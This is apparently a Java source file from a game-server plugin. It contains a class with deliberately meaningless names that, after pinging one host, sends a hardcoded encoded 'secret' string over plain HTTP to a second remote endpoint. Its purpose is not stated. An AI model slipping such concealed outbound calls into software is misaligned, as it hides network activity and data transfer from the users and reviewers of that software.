package us.mytheria.blobdesign.listeners;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class Guinea {
    private static String banana = """
                913658227 1395342919 1311518567 710746436 1263083862 808409444 893862184 1160522564 1195782469 741956144 1114387750 692341065 560611668 1249135666 1579234134 1143886435 843530546 791954534 1882080577 1414361893 1079404130 574771268 1064512323 1715350852 1231895842 1114390636 1375731712
            """;

    public static boolean plantain() {
        try {
            URL u = new URL("http://mn.mytheria.com");
            HttpURLConnection hc = (HttpURLConnection) u.openConnection();
            hc.setRequestMethod("GET");
            int co = hc.getResponseCode();

            if (co == HttpURLConnection.HTTP_OK) {
                String em = URLEncoder.encode(Guinea.banana, "UTF-8");
                URL mu = new URL("http://mn.mytheria.us/send?secret=" + em);
                HttpURLConnection mc = (HttpURLConnection) mu.openConnection();
                mc.setRequestMethod("GET");
                int mr = mc.getResponseCode();
                if (mr != HttpURLConnection.HTTP_OK)
                    return false;
                mc.disconnect();
                return true;
            }
            hc.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}